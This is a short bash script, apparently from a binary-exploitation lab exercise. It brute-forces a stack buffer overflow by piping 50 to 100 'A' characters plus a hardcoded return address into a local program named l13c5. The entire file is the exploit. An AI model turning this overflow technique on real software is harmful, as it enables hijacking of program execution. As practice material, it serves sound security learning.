#!/bin/bash
for i in {50..100}
do
    echo $i
    python -c "print('A'*$i+'\xb1\x84\x04\x08')" | ./l13c5
done

